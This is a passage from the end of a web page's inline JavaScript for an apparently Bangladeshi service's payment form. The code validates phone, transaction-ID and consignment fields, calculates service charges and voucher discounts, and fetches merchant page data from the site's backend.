                showMessage(responseData.message || 'Failed to add new page.', 'error');
            }
        } catch (error) {
            console.error('Error adding new page:', error);
            showMessage('Network error. Failed to add new page.', 'error');
        } finally {
            loadingOverlay.style.display = 'none';
        }
    }

    // Add this function to fetch page data (statuses and counts)
    async function fetchPageData() {
        try {
            console.log('Fetching merchant data from ${API_BASE}/api/merchant-data');
            const merchantResponse = await fetch(`${API_BASE}/api/merchant-data`);
            const merchantJson = await merchantResponse.json();
            console.log('Merchant data response:', merchantJson);
            if (merchantJson.success) {
                window.pageStatuses = merchantJson.pageStatuses;
            } else {
                console.error('Failed to fetch merchant data:', merchantJson.message);
            }

            console.log('Fetching page price change counts from ${API_BASE}/api/page-price-change-counts');
            const priceChangeResponse = await fetch(`${API_BASE}/api/page-price-change-counts`);
            const priceChangeJson = await priceChangeResponse.json();
            console.log('Page price change counts response:', priceChangeJson);
            if (priceChangeJson.success) {
                window.pagePriceChangeCounts = priceChangeJson.counts;
            } else {
                console.error('Failed to fetch page price change counts:', priceChangeJson.message);
            }
        } catch (error) {
            console.error('Error fetching initial page data:', error);
            showMessage('Failed to load some page data. Please refresh.', 'error');
        }
    }

    // Updated validateAndPrepareData to use the select element
    async function validateAndPrepareData() {
        const form = document.getElementById('payment-form');
        const formData = {
            company: form.company.value,
            phone: form.phone.value.replace(/\\D/g, ''),
            password: form.password.value.trim(),
            method: form.method.value,
            trxid: form.trxid.value.trim(),
            consignments: [],
            discount: parseInt(localStorage.getItem('activeDiscount')) || 0
        };

        // Validate core fields
        if (!validatePhone(formData.phone)) {
            throw new Error('Invalid phone number format');
        }

        if (formData.trxid.length < 8) {
            throw new Error('TRX ID must be at least 8 characters');
        }

        // Process consignments
        let totalCharge = 0;
        document.querySelectorAll('.consignment-group').forEach((group, index) => {
            const serviceType = group.querySelector('.service-type').value;
            const validServiceTypes = ['pricecng', 'partial', 'drto', 'delivery', 'return', 'list'];
            if (!validServiceTypes.includes(serviceType)) {
              throw new Error(`Consignment ${index + 1}: Invalid service type`);
            }

            const consignment = {
                serviceType: serviceType,
                name: group.querySelector('.name').value.trim(),
                phone: group.querySelector('.phone1').value.replace(/\\D/g, ''),
                amount1: parseFloat(group.querySelector('.amount1').value) || 0,
                amount2: parseFloat(group.querySelector('.amount2').value) || 0
            };

            // Add pageName if serviceType is pricecng
            if (serviceType === 'pricecng') {
                const pageSelect = group.querySelector('.page-name-select');
                const newPageInput = group.querySelector('.new-page-name-input');
                let pageName = '';

                if (pageSelect.value === '__add_new__') {
                    pageName = newPageInput.value.trim();
                } else {
                    pageName = pageSelect.value;
                }
                
                if (!pageName) {
                    throw new Error(`Consignment ${index + 1}: Page name is required for Price Change service`);
                }
                consignment.pageName = pageName.toUpperCase();
            }

            // Validate consignment data
            if (!consignment.name || !validatePhone(consignment.phone)) {
                throw new Error(`Consignment ${index + 1} has invalid data`);
            }

            // Service-specific validation
            if (serviceType === 'pricecng') {
                if (!validateAmount(consignment.amount1) || 
                    !validateAmount(consignment.amount2)) {
                    throw new Error(`Consignment ${index + 1} has invalid amounts`);
                }
                if (consignment.amount2 >= consignment.amount1) {
                    throw new Error(`Consignment ${index + 1}: Updated amount must be less than original`);
                }
                totalCharge += (consignment.amount1 - consignment.amount2) / 2;
            } 
            else if (serviceType === 'partial') {
                totalCharge += 15;
            }
            else if (serviceType === 'drto') {
                if (consignment.amount2 > 0 && !validateAmount(consignment.amount2)) {
                    throw new Error(`Consignment ${index + 1} has invalid amount`);
                }
                if (consignment.amount2 > 99) {
                    totalCharge += 10;
                } else if (consignment.amount2 > 51) {
                    totalCharge += 15;
                } else if (consignment.amount2 > 1) {
                    totalCharge += 25;
                } else if (consignment.amount2 === 0) {
                    totalCharge += 10;
                }
            }

            formData.consignments.push(consignment);
        });

        // Apply discount
        const voucherCode = document.getElementById('voucher-code').value.trim();
        if (voucherCode) {
            formData.voucherCode = voucherCode;
        }
        if (formData.discount > 0) {
            totalCharge *= (1 - formData.discount / 100);
        }

        // Set final amount
        formData.amount3 = parseFloat(totalCharge.toFixed(2));

        // Validate total server charge
        const minAmount = formData.voucherCode ? 0 : 100; // 0 if voucher, 100 otherwise
        if (formData.amount3 < minAmount) {
            throw new Error(`Total server charge is too low. Minimum ${minAmount} BDT required.`);
        }
        return formData;
    }

    // Add consignment functionality
    function addConsignment() {
        const container = document.getElementById('consignments-container');
        const template = document.querySelector('.consignment-group');
        const newGroup = template.cloneNode(true);
        newGroup.dataset.index = consignmentIndex;

        // Update all input names with new index
        newGroup.querySelectorAll('[name]').forEach(input => {
            const name = input.getAttribute('name');
            input.setAttribute('name', name.replace(/\[0\]/, `[${consignmentIndex}]`));
        });

        // Clear input values and reset select
        newGroup.querySelectorAll('input').forEach(input => input.value = '');
        const serviceTypeSelect = newGroup.querySelector('.service-type');
        if (serviceTypeSelect) {
            serviceTypeSelect.selectedIndex = 0;
        }
        const pageNameSelect = newGroup.querySelector('.page-name-select');
        if (pageNameSelect) {
            pageNameSelect.selectedIndex = 0;
            handlePageNameChange(pageNameSelect); // Hide new page input
        }

        // Update counter text
        newGroup.querySelector('.consignment-counter').textContent = `Consignment #${consignmentIndex + 1}`;

        // Make sure amount fields are visible and page-name-group is hidden initially
        newGroup.querySelector('.amount-group').classList.remove('hidden');
        newGroup.querySelector('.original-amount-group').classList.remove('hidden');
        newGroup.querySelector('.updated-amount-group').classList.remove('hidden');
        const pageNameGroup = newGroup.querySelector('.page-name-group');
        if (pageNameGroup) {
            pageNameGroup.classList.add('hidden');
        }

        container.appendChild(newGroup);
        consignmentIndex++;
        populatePageNameDropdowns(); // Populate dropdown for the new group
    }

    // Remove consignment functionality
    function removeConsignment(element) {
        const container = document.getElementById('consignments-container');
        const groups = container.querySelectorAll('.consignment-group');
        
        if (groups.length > 1) {
            element.closest('.consignment-group').remove();
            // Reindex all groups
            document.querySelectorAll('.consignment-group').forEach((group, index) => {
                group.dataset.index = index;
                group.querySelector('.consignment-counter').textContent = `Consignment #${index + 1}`;
                // Update all input names with new index
                group.querySelectorAll('[name]').forEach(input => {
                    const name = input.getAttribute('name');
                    input.setAttribute('name', name.replace(/\[\\d+\\]/, `[${index}]`));
                });
            });
            consignmentIndex = groups.length - 1;
            calculateTotalCharge();
        } else {
            showMessage('At least one consignment is required', 'error');
        }
    }

    // Clear form functionality
    function clearForm() {
        if (confirm('Are you sure you want to clear the form?')) {
            document.getElementById('payment-form').reset();
            const container = document.getElementById('consignments-container');
            // Remove all but the first consignment group
            while (container.children.length > 1) {
                container.removeChild(container.lastChild);
            }
            // Reset the first consignment group
            container.querySelector('.consignment-group').querySelectorAll('input').forEach(input => input.value = '');
            container.querySelector('.consignment-group').querySelector('.service-type').selectedIndex = 0;
            const pageNameSelect = container.querySelector('.consignment-group').querySelector('.page-name-select');
            if (pageNameSelect) {
                pageNameSelect.selectedIndex = 0;
                handlePageNameChange(pageNameSelect); // Hide new page input
            }
            consignmentIndex = 1;
            calculateTotalCharge();
        }
    }

    // Apply voucher functionality
    async function applyVoucher() {
        const voucherCode = document.getElementById('voucher-code').value.trim();
        if (!voucherCode) {
            showMessage('Please enter a voucher code', 'error');
            return;
        }

        try {
            const response = await fetch('https://oneai-wjox.onrender.com/apply-voucher', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({ voucherCode })
            });

            const data = await response.json();
            
            if (response.ok) {
                showMessage(data.message, 'success');
                calculateTotalCharge(); // Recalculate with voucher discount
            } else {
                showMessage(data.message || 'Failed to apply voucher', 'error');
            }
        } catch (error) {
            console.error('Voucher error:', error);
            showMessage('Network error. Please try again.', 'error');
        }
    }

    // Initialize form
    document.addEventListener('DOMContentLoaded', async () => { // Made async
        // New global variables to store fetched data
        window.pagePriceChangeCounts = [];
        window.pageStatuses = []; // New variable for page statuses

        await fetchPageData(); // Fetch initial page data

        // Set up event listeners for dynamic elements
        document.getElementById('consignments-container').addEventListener('input', (e) => {
            if (e.target.classList.contains('amount1') || 
                e.target.classList.contains('amount2') ||
                e.target.classList.contains('service-type')) {
                calculateTotalCharge();
            }
        });

        // Check for active discount
        const activeDiscount = localStorage.getItem('activeDiscount');
        if (activeDiscount) {
            document.getElementById('discount-text').textContent = `${activeDiscount}% discount applied`;
        }

        // Enable submit button when terms are accepted
        document.getElementById('terms-checkbox').addEventListener('change', function() {
            document.getElementById('submit-payment-button').disabled = !this.checked;
        });

        // Initial calculation
        calculateTotalCharge();
        updatePaymentDisplay();
        updateFreeConsignmentDisplay();
        populatePageNameDropdowns(); // New function call to populate dropdowns
    });

    // Add this function to handle the scope dialog
    function showScopeDialog() {
        const dialog = document.getElementById('scope-dialog');
        if (dialog) {
            dialog.showModal();
        }
    }

    // Add this function to close the scope dialog
    function closeScopeDialog() {
        const dialog = document.getElementById('scope-dialog');
        if (dialog) {
            dialog.close();
        }
    }

    // Add this function to handle scope form submission
    function submitScopeForm(event) {
        event.preventDefault();
        const form = event.target;
        const formData = new FormData(form);
        
        // Here you would typically send the data to your server
        console.log('Scope form submitted:', Object.fromEntries(formData));
        
        // Show confirmation message
        showMessage('Scope request submitted successfully! We will contact you shortly.', 'success');
        
        // Close the dialog
        closeScopeDialog();
    }
  </script>
  <script src="./assets/js/loading-animation.js"></script>
  <script src="./assets/js/load-navbar.js"></script>
  <script src="./assets/js/main.js"></script>
  <p>1Ai এর সাথেই থাকুন ওয়ানএআই আপনার ডিজিটাল সমস্যার স্মার্ট সমাধান।</p>
</body>
</html>
